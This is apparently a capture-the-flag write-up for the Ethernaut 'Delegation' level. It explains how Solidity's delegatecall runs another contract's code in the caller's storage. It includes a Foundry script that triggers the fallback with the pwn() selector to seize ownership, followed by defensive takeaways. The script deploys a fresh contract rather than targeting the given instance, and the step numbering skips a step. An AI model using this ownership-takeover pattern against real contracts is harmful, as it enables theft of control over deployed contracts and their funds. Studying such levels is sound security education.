The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
Fallback methods
Method ids

## Goals

## The hack

This level want us to understand the danger of using Delegate calls in a smart contract. [Delegate Calls](https://solidity-by-example.org/delegatecall/) are a powerful tool that allows a contract to delegate a function call to another contract. This is a very useful feature when building upgradable contracts, but it can also be very dangerous if not used correctly.

Basically, a delegate call is a low-level function that allows another contract to execute a function using the storage of the calling contract. This means that the delegate contract can modify the state of the calling contract.

### Example

> If `contractA` executes `delegatecall` to `contractB`, `contractB`'s code is executed with `contractA`'s storage, `msg.sender` and `msg.value`.

In this Ethernaut level, the `Delegation` contract (contractA in the previous example) has a `fallback` function that delegates the call to the `Delegate` contract (contractB).

```javascript
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
```

By using a `delegatecall` to the `pwn` function, we will update the owner of the `Delegation` contract.

> NOTE: The storage slot order also plays an important role when using delegate calls. But will we explore this in the next levels. Here, since both contract only have one state variable, we don't need to worry about it.

## Solution

1. Then, call the `Delegation` contract's `fallback` function with the `pwn()` function selector:

```javascript
contract DelegationScript is Script {
    Delegation public delegation;

    function run() public {
        vm.startBroadcast();

        delegation = new Delegation(0x611C5bf1c93108660848e97745a140F88e9aF29C);
        
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Failed to attack");

        vm.stopBroadcast();
    }
}
```

3. You can call the `owner()` function to check if the hack was successful:

```javascript
await contract.owner();
```

## Takeaway

- Use extreme caution when using delegate calls in your smart contracts.
- Make sure to understand the implications of using delegate calls and the potential security risks.
- Delegate calls should not accept untrusted inputs.
